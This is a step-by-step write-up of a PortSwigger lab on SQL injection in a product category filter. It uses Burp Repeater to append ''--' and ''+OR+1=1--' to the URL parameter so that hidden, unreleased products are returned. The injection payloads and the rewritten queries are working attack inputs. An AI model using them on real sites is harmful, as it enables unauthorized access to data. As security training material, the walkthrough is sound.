# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

## To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

**NOTE**
Comments in database
Oracle,Microsoft,PostgreSQL Uses `--`
MySQL User `#`

---

step 1

click on any category 
like here lifestyle click on lifestyle `/filter?category=Lifestyle`

![screnshot](./images/lab1_category_life_style.png)


step 2

use burpsuite to trace all traffic 
in burpsuite go to proxy => http history => you will see `/filter?category=Lifestyle` send to repeater

![screnshot](./images/lab1_http_history_lifestyle.png)


![screnshot](./images/lab1_repeater_lifestyle.png)

step 3

add `'--` at the end of URL request 
`/filter?category=Lifestyle'--`
send request you will get 200 response

![screnshot](./images/lab1_add_first_payload.png)

in render section you see only lifestyle related product showing

![screnshot](./images/lab1_render_lifestyle_repeater.png)

SQL query be like
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

step 4

add `'+OR+1=1--` at the end of URL request 
`/filter?category=Lifestyle'+OR+1=1--`
send request you will get 200 response
go to render section you will notice there are hidden product also visible with lifestyle

![screnshot](./images/lab1_hidden_data.png)

SQL query be like
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

step 5

reload home page into browser to solve lab

![screnshot](./images/lab1_solved_lab.png)